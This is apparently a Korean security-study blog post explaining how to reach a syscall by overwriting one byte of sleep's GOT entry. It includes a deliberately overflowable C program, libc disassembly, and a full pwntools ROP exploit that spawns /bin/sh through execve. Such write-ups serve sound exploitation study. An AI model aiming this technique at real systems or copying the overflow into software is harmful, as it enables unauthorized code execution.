---
layout: post
title: "Overwriting 1-byte to call syscall"
date: 2018-11-21
excerpt: "syscall gadget making"
tags: [study]
comments: true
--- 
syscall 가젯이 존재하지 않고 libc leak 벡터가 보이지 않을 때 syscall을 부를 수 있는 방법이 있습니다.

제가 사용 중인 트러스트 동아리 서버 libc 기준으로 설명 하겠습니다.

```c
#include <stdio.h>

void help()
{
	asm("pop %rax");
	asm("pop %rdx");
	asm("ret");
}

int main()
{
	char buf[24];

	sleep(1);

	read(0, buf, 512);
	
	return 0;
}
```
위와 같은 코드를 작성했습니다. 편의를 위해 가젯 몇 개를 추가했습니다.

사용할 만한 plt는 read 밖에 없기에, 일반적인 방법으로 leak을 할 수도 없는 상황입니다. 일단 libc를 살펴보겠습니다.

```
pwndbg> x/20i sleep
   0xcc230 <__sleep>:	push   rbp
   0xcc231 <__sleep+1>:	push   rbx
   0xcc232 <__sleep+2>:	mov    eax,edi
   0xcc234 <__sleep+4>:	sub    rsp,0x18
   0xcc238 <__sleep+8>:	mov    rbx,QWORD PTR [rip+0x2f7c39]        # 0x3c3e78
   0xcc23f <__sleep+15>:	mov    rdi,rsp
   0xcc242 <__sleep+18>:	mov    rsi,rsp
   0xcc245 <__sleep+21>:	mov    QWORD PTR [rsp+0x8],0x0
   0xcc24e <__sleep+30>:	mov    QWORD PTR [rsp],rax 
   0xcc252 <__sleep+34>:	mov    ebp,DWORD PTR fs:[rbx]
   0xcc255 <__sleep+37>:	call   0xcc2e0 <nanosleep>
   0xcc25a <__sleep+42>:	test   eax,eax
   0xcc25c <__sleep+44>:	js     0xcc270 <__sleep+64>
   0xcc25e <__sleep+46>:	mov    DWORD PTR fs:[rbx],ebp
   0xcc261 <__sleep+49>:	add    rsp,0x18
   0xcc265 <__sleep+53>:	xor    eax,eax
   0xcc267 <__sleep+55>:	pop    rbx
   0xcc268 <__sleep+56>:	pop    rbp
   0xcc269 <__sleep+57>:	ret    
   0xcc26a <__sleep+58>:	nop    WORD PTR [rax+rax*1+0x0]
pwndbg> 
   0xcc270 <__sleep+64>:	mov    eax,DWORD PTR [rsp]
   0xcc273 <__sleep+67>:	add    rsp,0x18
   0xcc277 <__sleep+71>:	pop    rbx
   0xcc278 <__sleep+72>:	pop    rbp
   0xcc279 <__sleep+73>:	ret    
   0xcc27a:	nop    WORD PTR [rax+rax*1+0x0]
   0xcc280 <pause>:	cmp    DWORD PTR [rip+0x2fd4b9],0x0        # 0x3c9740 <__libc_multiple_threads>
   0xcc287 <pause+7>:	jne    0xcc299 <pause+25>
   0xcc289 <__pause_nocancel>:	mov    eax,0x22
   0xcc28e <__pause_nocancel+5>:	syscall                               <------------ SYSCALL!
   0xcc290 <__pause_nocancel+7>:	cmp    rax,0xfffffffffffff001
   0xcc296 <__pause_nocancel+13>:	jae    0xcc2c9 <pause+73>
   0xcc298 <__pause_nocancel+15>:	ret    
   0xcc299 <pause+25>:	sub    rsp,0x8
   0xcc29d <pause+29>:	call   0x1150d0 <__libc_enable_asynccancel>
   0xcc2a2 <pause+34>:	mov    QWORD PTR [rsp],rax
   0xcc2a6 <pause+38>:	mov    eax,0x22
   0xcc2ab <pause+43>:	syscall                                         <------------ SYSCALL!
   0xcc2ad <pause+45>:	mov    rdi,QWORD PTR [rsp]
   0xcc2b1 <pause+49>:	mov    rdx,rax
```
문제에서 사용된 sleep에서 조금 내려가보니 하위 1 바이트만 바뀐 위치에 syscall이 존재합니다. (0xcc230 -> 0xcc28e, 0xcc2ab)

여기서 중요한 사실은, libc의 하위 1바이트는 고정되는 값이라는 점입니다.

따라서 sleep의 하위 1 바이트를 read를 이용해 syscall의 값으로 덮어쓴다면, sleep이 call 될 때 syscall이 호출됩니다.

예제로 사용된 바이너리를 설명한 기법과 syscall을 이용하여 exploit 한다면 아래와 같은 익스 코드를 짤 수 있습니다.

```python
from pwn import *

p = process('./sysleep')
e = ELF('./sysleep')

prax_rdx  = 0x40056a
prdi      = 0x400613
prsi_pr   = 0x400611
prdx 	  = 0x40056b

plt_read  = e.plt['read']
got_sleep = e.got['sleep']
plt_sleep = e.plt['sleep']

pay = 'A' * 40

pay += p64(prdi)    + p64(0)
pay += p64(prsi_pr) + p64(e.bss()) + p64(0)
pay += p64(prdx)    + p64(8) 
pay += p64(plt_read)

pay += p64(prdi)    + p64(0)
pay += p64(prsi_pr) + p64(got_sleep) + p64(0)
pay += p64(prdx)    + p64(4)
pay += p64(plt_read)

pay += p64(prax_rdx)
pay += p64(59) # rax : 59  = execve()
pay += p64(0) # rdx : NULL
pay += p64(prdi)
pay += p64(e.bss()) # rdi : bss = '/bin/sh\x00'
pay += p64(prsi_pr)
pay += p64(0) # rsi : NULL
pay += p64(0)	

pay += p64(plt_sleep)

sleep(1.5) 

p.send(pay)
p.send('/bin/sh\x00')
p.send('\x8e')

p.interactive()
```

굳이 sleep이 아니더라도 다른 함수에 이러한 기법을 적용할 수 있습니다. (ex. write, read)
